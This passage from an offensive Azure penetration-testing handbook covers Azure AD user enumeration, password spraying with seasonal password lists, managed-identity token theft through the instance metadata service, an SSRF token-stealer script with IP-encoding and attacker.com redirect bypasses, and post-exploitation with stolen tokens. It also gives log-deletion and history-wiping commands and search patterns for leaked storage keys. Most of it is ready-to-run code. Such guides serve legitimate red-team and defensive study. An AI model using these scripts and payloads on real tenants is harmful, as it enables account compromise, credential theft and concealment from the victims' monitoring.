curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@company.com&xml=1"

# Modern API
curl -s "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"Username":"user@company.com"}' | jq .
```

### User Enumeration

**Timing-based user enumeration:**

Valid and invalid users receive different response times or error messages during authentication attempts.

```bash
# Method 1: Office 365 authentication endpoint
curl -s -w "\nTime: %{time_total}s\n" \
  "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"Username":"testuser@company.com"}'

# IfExistsResult values:
# 0 = User does not exist
# 1 = User exists
# 5 = User exists, federation configured
# 6 = User exists, password authentication

# Method 2: Automated enumeration with o365spray
git clone https://github.com/0xZDH/o365spray
cd o365spray
pip3 install -r requirements.txt

# Validate users
python3 o365spray.py --validate -U userlist.txt --domain company.com

# Method 3: Using MSOLSpray (PowerShell)
git clone https://github.com/dafthack/MSOLSpray
Import-Module .\MSOLSpray.ps1

Invoke-MSOLSpray -UserList .\userlist.txt -Domain company.com -Validate
```

**Common username formats:**

```
firstname.lastname@company.com
firstname_lastname@company.com
flastname@company.com
f.lastname@company.com
firstnamelastname@company.com
firstname@company.com
lastname@company.com
```

**Username generation:**

```bash
# From full names list
while IFS= read -r line; do
    first=$(echo $line | awk '{print tolower($1)}')
    last=$(echo $line | awk '{print tolower($2)}')
    echo "${first}.${last}@company.com"
    echo "${first:0:1}${last}@company.com"
    echo "${first}_${last}@company.com"
    echo "${first}${last}@company.com"
done < names.txt > usernames.txt
```

### Password Spraying

After identifying valid users, password spraying attempts common passwords against all accounts. Azure AD has account lockout policies.

**Important lockout thresholds:**

- Default: 10 failed attempts before lockout
- Lockout duration: 60 seconds (increases with repeated lockouts)
- Smart lockout: Microsoft's ML-based protection
- Safe strategy: 1 password per hour across all accounts

```bash
# Method 1: Using o365spray
python3 o365spray.py --spray -U validusers.txt -P passwordlist.txt \
  --domain company.com --count 1 --lockout 60 --rate 30

# Method 2: Using MSOLSpray
Invoke-MSOLSpray -UserList .\validusers.txt -Password "Winter2024!" -Domain company.com

# Method 3: Using TREVORspray (handles rate limiting)
git clone https://github.com/blacklanternsecurity/TREVORspray
cd TREVORspray
pip3 install -r requirements.txt

trevorspray --recon company.com  # Reconnaissance
trevorspray --spray -e validemails.txt -p "Password123!" --url https://login.microsoftonline.com
```

**Effective password lists for spraying:**

```
Password123!
Winter2024!
Summer2024!
Spring2024!
Fall2024!
Company@123
Welcome123!
Changeme123!
[CompanyName]123!
[CompanyName]@2024
[Season][Year]!
```

### Authenticated Enumeration

Once credentials are obtained, extensive enumeration is possible.

**Using Azure CLI:**

```bash
# Authenticate
az login -u user@company.com -p password

# Alternative: Use device code flow (useful for MFA)
az login --use-device-code

# Get current user context
az account show
az ad signed-in-user show

# Enumerate users
az ad user list --output table
az ad user list --query "[].{UPN:userPrincipalName,DisplayName:displayName}" -o table

# Get specific user details
az ad user show --id user@company.com

# Enumerate groups
az ad group list --output table

# Get group members
az ad group member list --group "GroupName" --output table

# Enumerate applications (service principals)
az ad app list --output table
az ad sp list --all --output table

# Enumerate roles and permissions
az role assignment list --output table
az role assignment list --assignee user@company.com

# Enumerate resources (if RBAC permissions available)
az resource list --output table
az vm list --output table
az storage account list --output table
```

**Using Microsoft Graph API:**

The Graph API provides comprehensive access to Azure AD data.

```bash
# Get access token
TOKEN=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)

# Alternative: Get token via API
TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -d "client_id=<app-id>&scope=https://graph.microsoft.com/.default&client_secret=<secret>&grant_type=client_credentials" | jq -r '.access_token')

# Enumerate users
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users" | jq .

# Get user details
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users/user@company.com" | jq .

# Enumerate groups
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups" | jq .

# Get group members
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups/<group-id>/members" | jq .

# Enumerate applications
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications" | jq .

# Get service principal details
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals" | jq .

# Enumerate directory roles
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/directoryRoles" | jq .

# Get role members (e.g., Global Administrators)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/directoryRoles/<role-id>/members" | jq .
```

**Using ROADtools (Azure AD reconnaissance framework):**

```bash
# Install ROADtools
pip3 install roadrecon

# Authenticate and gather data
roadrecon auth -u user@company.com -p password

# Alternative: Use access token
roadrecon auth --access-token <token>

# Gather all accessible data
roadrecon gather

# Start web interface for analysis
roadrecon gui

# Export to BloodHound format for visualization
roadrecon plugin bloodhound -f export.json
```

**Using AADInternals for advanced reconnaissance:**

```powershell
# Get access token
$token = Get-AADIntAccessTokenForAADGraph -Credentials (Get-Credential)

# Or use existing credentials
$token = Get-AADIntAccessTokenForAADGraph -UserName "user@company.com" -Password "password"

# Enumerate tenant information
Get-AADIntTenantDetails -AccessToken $token

# Get all users
Get-AADIntUsers -AccessToken $token

# Get user's groups
Get-AADIntUserGroups -AccessToken $token -UserPrincipalName "user@company.com"

# Get service principals
Get-AADIntServicePrincipals -AccessToken $token

# Get directory roles
Get-AADIntDirectoryRoles -AccessToken $token

# Get conditional access policies
Get-AADIntConditionalAccessPolicies -AccessToken $token

# Export all data
Get-AADIntUsers -AccessToken $token | Export-Csv users.csv
Get-AADIntServicePrincipals -AccessToken $token | Export-Csv apps.csv
```

### Application and Service Principal Enumeration

Applications and service principals are critical for privilege escalation and lateral movement.

```bash
# List applications with high-privilege permissions
az ad app list --query "[?appRoles[?value=='Directory.ReadWrite.All']]" -o table

# Get application credentials (if privileged)
az ad app credential list --id <app-id>

# List service principals
az ad sp list --all --query "[].{Name:displayName,AppId:appId,Type:servicePrincipalType}" -o table

# Get service principal credentials
az ad sp credential list --id <sp-id>

# Check OAuth2 permissions grants
az ad app permission list --id <app-id>
```

**High-value application permissions to look for:**

- `Directory.ReadWrite.All` - Read/write all directory data
- `RoleManagement.ReadWrite.Directory` - Manage directory roles
- `Application.ReadWrite.All` - Manage all applications
- `Mail.Read` / `Mail.ReadWrite` - Read/write emails
- `Files.ReadWrite.All` - Access all files

### Conditional Access Policy Enumeration

Conditional access policies control when and how users can access resources.

```powershell
# Using AADInternals
$token = Get-AADIntAccessTokenForAADGraph
Get-AADIntConditionalAccessPolicies -AccessToken $token

# Check for MFA requirements
Get-AADIntConditionalAccessPolicies -AccessToken $token | Where-Object {$_.grantControls.builtInControls -contains "mfa"}

# Check for device compliance requirements
Get-AADIntConditionalAccessPolicies -AccessToken $token | Where-Object {$_.grantControls.builtInControls -contains "compliantDevice"}
```

## Azure VM Metadata Service

The Azure Instance Metadata Service (IMDS) provides information about running VM instances, similar to AWS EC2 metadata. This is a critical service for privilege escalation.

### IMDS Basics

**Endpoint:** `http://169.254.169.254/metadata/` **Required header:** `Metadata: true` **No authentication required from the VM**

### Querying Instance Metadata

```bash
# Basic instance information
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq .

# Specific API versions
# 2017-12-01: Initial version
# 2018-10-01: Added scheduled events
# 2019-06-04: Added identity endpoint
# 2021-02-01: Current stable version

# Get compute information
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | jq .

# Get network information
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | jq .

# Get specific values
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&format=text"

curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text"
```

**Key metadata fields:**

```json
{
  "compute": {
    "vmId": "unique-vm-identifier",
    "subscriptionId": "subscription-guid",
    "resourceGroupName": "rg-name",
    "name": "vm-name",
    "location": "eastus",
    "vmSize": "Standard_D2s_v3",
    "osType": "Linux",
    "imageReference": {
      "publisher": "Canonical",
      "offer": "UbuntuServer",
      "sku": "18.04-LTS"
    },
    "tags": "environment:prod;owner:teamname"
  },
  "network": {
    "interface": [{
      "ipv4": {
        "ipAddress": [{
          "privateIpAddress": "10.0.1.4",
          "publicIpAddress": "20.x.x.x"
        }],
        "subnet": [{
          "address": "10.0.1.0",
          "prefix": "24"
        }]
      }
    }]
  }
}
```

### Managed Identity Token Acquisition

Managed identities provide Azure AD authentication without credentials. VMs with managed identities can request access tokens from IMDS.

**Two types of managed identities:**

1. **System-assigned:** Tied to VM lifecycle, deleted with VM
2. **User-assigned:** Independent lifecycle, can be assigned to multiple resources

**Acquire access token for Azure Resource Manager:**

```bash
# Get token for ARM (Azure Resource Manager)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .

# Extract access token
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r '.access_token')

# Decode JWT token to see permissions
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
```

**Acquire tokens for different resources:**

```bash
# Microsoft Graph API
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | jq -r '.access_token'

# Azure Key Vault
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | jq -r '.access_token'

# Azure Storage
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | jq -r '.access_token'

# Azure Database
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/" | jq -r '.access_token'

# For user-assigned managed identity
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<managed-identity-client-id>" | jq .
```

### Using Managed Identity Tokens

Once a token is acquired, use it to authenticate to Azure services.

```bash
# Get ARM token
ARM_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r '.access_token')

# List subscriptions accessible with this identity

curl -s -H "Authorization: Bearer $ARM_TOKEN"  
"https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .

# List resource groups

SUBSCRIPTION_ID=$(curl -s -H "Authorization: Bearer $ARM_TOKEN"  
"https://management.azure.com/subscriptions?api-version=2020-01-01" | jq -r '.value[0].subscriptionId')

curl -s -H "Authorization: Bearer $ARM_TOKEN"  
"https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourcegroups?api-version=2021-04-01" | jq .

# List VMs

curl -s -H "Authorization: Bearer $ARM_TOKEN"  
"https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Compute/virtualMachines?api-version=2021-07-01" | jq .

# List storage accounts

curl -s -H "Authorization: Bearer $ARM_TOKEN"  
"https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01" | jq .

# Get role assignments for the managed identity

curl -s -H "Authorization: Bearer $ARM_TOKEN"  
"https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq .
````

**Accessing Key Vault with managed identity:**

```bash
# Get Key Vault token
KV_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | jq -r '.access_token')

# List secrets (requires Key Vault "List" permission)
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://keyvaultname.vault.azure.net/secrets?api-version=7.3" | jq .

# Get secret value (requires "Get" permission)
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://keyvaultname.vault.azure.net/secrets/secretname?api-version=7.3" | jq -r '.value'

# List keys
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://keyvaultname.vault.azure.net/keys?api-version=7.3" | jq .

# List certificates
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://keyvaultname.vault.azure.net/certificates?api-version=7.3" | jq .
````

**Accessing Storage with managed identity:**

```bash
# Get Storage token
STORAGE_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | jq -r '.access_token')

# List blobs using OAuth token (requires "Storage Blob Data Reader" role)
curl -s -H "Authorization: Bearer $STORAGE_TOKEN" \
  -H "x-ms-version: 2021-08-06" \
  "https://storageaccount.blob.core.windows.net/container?restype=container&comp=list"

# Download blob
curl -H "Authorization: Bearer $STORAGE_TOKEN" \
  -H "x-ms-version: 2021-08-06" \
  "https://storageaccount.blob.core.windows.net/container/blobname.txt"
```

### SSRF to IMDS Exploitation

Server-Side Request Forgery (SSRF) vulnerabilities in Azure VMs can be exploited to access IMDS and steal managed identity tokens.

**Basic SSRF payload:**

```bash
# Direct IMDS access
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# With required header (if application forwards headers)
# Add: Metadata: true

# Token acquisition
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**SSRF bypass techniques:**

```bash
# URL encoding
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F

# Decimal IP representation
http://2852039166/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Hexadecimal IP
http://0xa9fefea9/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Octal IP
http://0251.0376.0376.0251/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DNS-based (if resolver allows)
# Register DNS: imds.attacker.com -> 169.254.169.254
http://imds.attacker.com/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# URL redirect chains
# Host a redirect: http://attacker.com/redir -> http://169.254.169.254/metadata/...
```

**Testing for SSRF with header injection:**

Some applications may allow header injection through URL parameters or other inputs.

```bash
# If application accepts URL with protocol handlers
url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
headers=Metadata:true

# Combined in vulnerable parameter
fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/&header=Metadata:true
```

**Automated SSRF to IMDS exploitation:**

```bash
#!/bin/bash
# SSRF to Azure IMDS token stealer

SSRF_URL="$1"  # Vulnerable SSRF endpoint, e.g., http://target.com/fetch?url=

echo "[+] Testing SSRF to Azure IMDS"

# Test basic connectivity
echo "[*] Testing instance metadata access..."
RESULT=$(curl -s "${SSRF_URL}http://169.254.169.254/metadata/instance?api-version=2021-02-01")

if echo "$RESULT" | grep -q "compute"; then
    echo "[+] IMDS accessible! VM metadata retrieved."
    echo "$RESULT" | jq . > imds-metadata.json
    
    # Extract useful info
    echo "[*] Extracting VM information..."
    VM_ID=$(echo "$RESULT" | jq -r '.compute.vmId')
    SUBSCRIPTION=$(echo "$RESULT" | jq -r '.compute.subscriptionId')
    RG=$(echo "$RESULT" | jq -r '.compute.resourceGroupName')
    
    echo "    VM ID: $VM_ID"
    echo "    Subscription: $SUBSCRIPTION"
    echo "    Resource Group: $RG"
    
    # Attempt token acquisition
    echo "[*] Attempting to acquire managed identity token..."
    TOKEN_RESPONSE=$(curl -s "${SSRF_URL}http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
    
    if echo "$TOKEN_RESPONSE" | grep -q "access_token"; then
        echo "[!] SUCCESS! Managed identity token acquired!"
        TOKEN=$(echo "$TOKEN_RESPONSE" | jq -r '.access_token')
        echo "$TOKEN" > stolen-token.txt
        
        # Decode token to see permissions
        echo "[*] Token claims:"
        echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
        
        echo "[+] Token saved to: stolen-token.txt"
    else
        echo "[-] No managed identity configured or token acquisition failed"
    fi
else
    echo "[-] IMDS not accessible via SSRF"
fi
```

### Custom Data and User Data

Azure VMs support custom data (cloud-init scripts) and user data that may contain sensitive information.

```bash
# Retrieve custom data (base64 encoded)
CUSTOM_DATA=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01&format=text")

# Decode custom data
echo "$CUSTOM_DATA" | base64 -d

# User data (available in newer API versions)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" | base64 -d
```

**Custom data often contains:**

- Initial setup scripts
- Configuration files
- Database connection strings
- API keys and secrets
- SSH keys
- Service credentials

### Azure Serial Console Access

If you have contributor+ access to a VM, Azure Serial Console provides direct access similar to physical console access.

```bash
# Enable boot diagnostics (required for serial console)
az vm boot-diagnostics enable --name vm-name --resource-group rg-name \
  --storage https://storageaccount.blob.core.windows.net/

# Access via Azure Portal: VM > Support + troubleshooting > Serial console
# Or use Azure CLI
az serial-console connect --name vm-name --resource-group rg-name
```

### VM Extension Enumeration

VM extensions are scripts/applications that run on VMs. They may contain credentials or provide privilege escalation paths.

```bash
# List VM extensions (requires ARM token)
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM_NAME/extensions?api-version=2021-07-01" | jq .

# Common sensitive extensions:
# - CustomScriptExtension: May contain credentials in scripts
# - AADLoginForLinux/AADLoginForWindows: Azure AD authentication
# - MicrosoftMonitoringAgent: Log Analytics credentials
# - AzureDiskEncryption: Encryption keys in Key Vault

# From inside VM, check extension files
# Linux extensions location
ls -la /var/lib/waagent/
cat /var/lib/waagent/*/config/*.settings

# Windows extensions location
# C:\Packages\Plugins\
# C:\WindowsAzure\Logs\Plugins\
```

### Scheduled Events

Azure Scheduled Events notify VMs of upcoming maintenance or service events.

```bash
# Query scheduled events
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" | jq .

# Example response shows maintenance windows
{
  "DocumentIncarnation": 1,
  "Events": [{
    "EventId": "1234-5678",
    "EventType": "Reboot",
    "ResourceType": "VirtualMachine",
    "Resources": ["vm-name"],
    "EventStatus": "Scheduled",
    "NotBefore": "2025-10-25T10:00:00Z"
  }]
}
```

### Attested Data and TPM

Azure provides attested metadata that can be cryptographically verified using TPM.

```bash
# Get attested document
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" | jq .

# Contains JWT with:
# - VM ID
# - Subscription ID
# - Signed by Azure
# - Can be verified against Azure public keys
```

### Comprehensive IMDS Enumeration Script

```bash
#!/bin/bash
# Azure IMDS comprehensive enumeration

OUTPUT_DIR="imds-enum-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[+] Starting Azure IMDS enumeration"

# Check IMDS connectivity
if ! curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" &>/dev/null; then
    echo "[-] IMDS not accessible. Not running on Azure VM or network blocked."
    exit 1
fi

echo "[+] IMDS accessible!"

# Instance metadata
echo "[*] Gathering instance metadata..."
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq . > "$OUTPUT_DIR/instance-metadata.json"

# Extract key information
VM_ID=$(jq -r '.compute.vmId' "$OUTPUT_DIR/instance-metadata.json")
SUBSCRIPTION=$(jq -r '.compute.subscriptionId' "$OUTPUT_DIR/instance-metadata.json")
RG=$(jq -r '.compute.resourceGroupName' "$OUTPUT_DIR/instance-metadata.json")
LOCATION=$(jq -r '.compute.location' "$OUTPUT_DIR/instance-metadata.json")

echo "    VM ID: $VM_ID"
echo "    Subscription: $SUBSCRIPTION"
echo "    Resource Group: $RG"
echo "    Location: $LOCATION"

# Custom data
echo "[*] Checking for custom data..."
CUSTOM_DATA=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01&format=text")
if [ ! -z "$CUSTOM_DATA" ]; then
    echo "$CUSTOM_DATA" | base64 -d > "$OUTPUT_DIR/custom-data.txt"
    echo "    [+] Custom data found and decoded"
fi

# User data
echo "[*] Checking for user data..."
USER_DATA=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" 2>/dev/null)
if [ ! -z "$USER_DATA" ]; then
    echo "$USER_DATA" | base64 -d > "$OUTPUT_DIR/user-data.txt"
    echo "    [+] User data found and decoded"
fi

# Managed identity tokens
echo "[*] Attempting to acquire managed identity tokens..."

# ARM token
ARM_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | jq -r '.access_token')

if [ "$ARM_TOKEN" != "null" ] && [ ! -z "$ARM_TOKEN" ]; then
    echo "    [+] ARM token acquired!"
    echo "$ARM_TOKEN" > "$OUTPUT_DIR/token-arm.txt"
    echo "$ARM_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . > "$OUTPUT_DIR/token-arm-decoded.json"
    
    # Graph token
    GRAPH_TOKEN=$(curl -s -H "Metadata: true" \
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>/dev/null | jq -r '.access_token')
    if [ "$GRAPH_TOKEN" != "null" ] && [ ! -z "$GRAPH_TOKEN" ]; then
        echo "    [+] Graph API token acquired!"
        echo "$GRAPH_TOKEN" > "$OUTPUT_DIR/token-graph.txt"
    fi
    
    # Key Vault token
    KV_TOKEN=$(curl -s -H "Metadata: true" \
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>/dev/null | jq -r '.access_token')
    if [ "$KV_TOKEN" != "null" ] && [ ! -z "$KV_TOKEN" ]; then
        echo "    [+] Key Vault token acquired!"
        echo "$KV_TOKEN" > "$OUTPUT_DIR/token-keyvault.txt"
    fi
    
    # Storage token
    STORAGE_TOKEN=$(curl -s -H "Metadata: true" \
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>/dev/null | jq -r '.access_token')
    if [ "$STORAGE_TOKEN" != "null" ] && [ ! -z "$STORAGE_TOKEN" ]; then
        echo "    [+] Storage token acquired!"
        echo "$STORAGE_TOKEN" > "$OUTPUT_DIR/token-storage.txt"
    fi
    
    # Enumerate accessible resources with ARM token
    echo "[*] Enumerating accessible Azure resources..."
    
    curl -s -H "Authorization: Bearer $ARM_TOKEN" \
      "https://management.azure.com/subscriptions?api-version=2020-01-01" > "$OUTPUT_DIR/subscriptions.json"
    
    curl -s -H "Authorization: Bearer $ARM_TOKEN" \
      "https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups?api-version=2021-04-01" > "$OUTPUT_DIR/resource-groups.json"
    
    curl -s -H "Authorization: Bearer $ARM_TOKEN" \
      "https://management.azure.com/subscriptions/$SUBSCRIPTION/providers/Microsoft.Compute/virtualMachines?api-version=2021-07-01" > "$OUTPUT_DIR/vms.json"
    
    curl -s -H "Authorization: Bearer $ARM_TOKEN" \
      "https://management.azure.com/subscriptions/$SUBSCRIPTION/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01" > "$OUTPUT_DIR/storage-accounts.json"
    
    curl -s -H "Authorization: Bearer $ARM_TOKEN" \
      "https://management.azure.com/subscriptions/$SUBSCRIPTION/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01" > "$OUTPUT_DIR/key-vaults.json"
    
    echo "    [+] Resource enumeration complete"
else
    echo "    [-] No managed identity configured"
fi

# Scheduled events
echo "[*] Checking scheduled events..."
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" > "$OUTPUT_DIR/scheduled-events.json"

# Attested data
echo "[*] Retrieving attested data..."
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" > "$OUTPUT_DIR/attested-data.json"

echo "[+] Enumeration complete! Results in: $OUTPUT_DIR/"
echo ""
echo "[*] Summary of findings:"
ls -lh "$OUTPUT_DIR/"
```

### Post-Exploitation with Stolen Tokens

Once managed identity tokens are acquired (via IMDS or SSRF), leverage them for further access.

```bash
# Use stolen ARM token
ARM_TOKEN=$(cat stolen-token.txt)

# Install and configure Azure CLI to use the token
az login --service-principal -u <managed-identity-client-id> -p <token> --tenant <tenant-id> --allow-no-subscriptions

# Alternative: Use token directly with API calls
# Enumerate all accessible resources
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resources?api-version=2021-04-01" | jq -r '.value[] | "\(.type) - \(.name)"'

# Look for storage accounts
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01" | jq -r '.value[].name'

# Get storage account keys (if authorized)
curl -s -X POST -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$STORAGE_ACCOUNT/listKeys?api-version=2021-09-01" | jq .

# Look for Key Vaults
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01" | jq -r '.value[].name'
```

### Defense Evasion

**Clearing Azure VM logs:**

```bash
# Linux VM agent logs
rm -f /var/log/waagent.log
rm -f /var/log/azure/*

# Cloud-init logs
rm -f /var/log/cloud-init*.log

# Clear command history
history -c
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history

# Windows VM agent logs
# C:\WindowsAzure\Logs\
# del C:\WindowsAzure\Logs\*.log
```

**Avoiding detection in Azure logging:**

[Inference] Azure Monitor and Log Analytics may capture API calls made with managed identities. Using tokens for read-only operations is less likely to trigger alerts than write operations.

---

**Related critical topics:** Azure Key Vault Exploitation, Azure Kubernetes Service (AKS) Security, Azure Function Exploitation, Cross-Account Privilege Escalation, Azure AD PRT Token Theft

---

## Storage Account Key Exposure

### Overview

Azure Storage Accounts use access keys for authentication, providing full access to all storage services (Blob, File, Queue, Table). Key exposure is a critical vulnerability as these keys grant unrestricted access to stored data and can persist even after key rotation if not properly revoked.

### Access Key Architecture

Storage accounts generate two 512-bit access keys (key1 and key2) that function identically. The dual-key system enables key rotation without service disruption. Keys provide complete control over:

- Blob containers and objects
- File shares
- Queue messages
- Table data
- Account configuration (when combined with management permissions)

### Enumeration Techniques

#### Identifying Storage Accounts

```bash
# DNS enumeration for storage accounts
dig <account-name>.blob.core.windows.net
dig <account-name>.file.core.windows.net
dig <account-name>.queue.core.windows.net
dig <account-name>.table.core.windows.net

# Enumerate via Azure CLI (requires authentication)
az storage account list --output table
az storage account list --query "[].{Name:name, Location:location}" --output table

# Check if storage account exists (HTTP 400 vs 404 behavior)
curl -I https://<account-name>.blob.core.windows.net/
```

#### Common Key Exposure Vectors

1. **Source Code Repositories**: Connection strings in configuration files
2. **Configuration Files**: web.config, appsettings.json, .env files
3. **CI/CD Pipelines**: Azure DevOps variables, GitHub Actions secrets
4. **Application Logs**: Debug output containing connection strings
5. **Client-Side Code**: JavaScript files with embedded credentials
6. **Backup Files**: .bak, .old, .tmp files containing configurations
7. **Documentation**: README files, wiki pages with example credentials
8. **Container Images**: Hardcoded credentials in Docker layers

#### Searching for Exposed Keys

```bash
# GitHub/GitLab search patterns
"DefaultEndpointsProtocol=https;AccountName=*.core.windows.net"
"AccountKey=" site:github.com
"azure storage" "AccountKey"
"UseDevelopmentStorage=false"

# grep patterns for local files
grep -r "DefaultEndpointsProtocol" /path/to/source/
grep -r "AccountKey=" /path/to/source/
grep -r "core.windows.net" /path/to/source/ | grep -i "key"

# Connection string format
# DefaultEndpointsProtocol=https;AccountName=<name>;AccountKey=<key>;EndpointSuffix=core.windows.net
```

### Exploitation with Azure CLI

#### Installing Azure CLI

```bash
# Debian/Ubuntu
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Manual installation
curl -L https://aka.ms/InstallAzureCli | bash

# Verify installation
az --version
```

#### Authentication with Storage Keys

```bash
# Set environment variable
export AZURE_STORAGE_CONNECTION_STRING="DefaultEndpointsProtocol=https;AccountName=<account>;AccountKey=<key>;EndpointSuffix=core.windows.net"

# Alternative: Use key directly
export AZURE_STORAGE_ACCOUNT="<account-name>"
export AZURE_STORAGE_KEY="<access-key>"

# Test access
az storage account show --name <account-name>
```

#### Blob Storage Enumeration

```bash
# List all containers
az storage container list --output table
az storage container list --connection-string $AZURE_STORAGE_CONNECTION_STRING

# List blobs in container
az storage blob list --container-name <container> --output table
az storage blob list -c <container> --prefix <path/> --output table

# Get blob properties
az storage blob show --container-name <container> --name <blob-name>

# Download blob
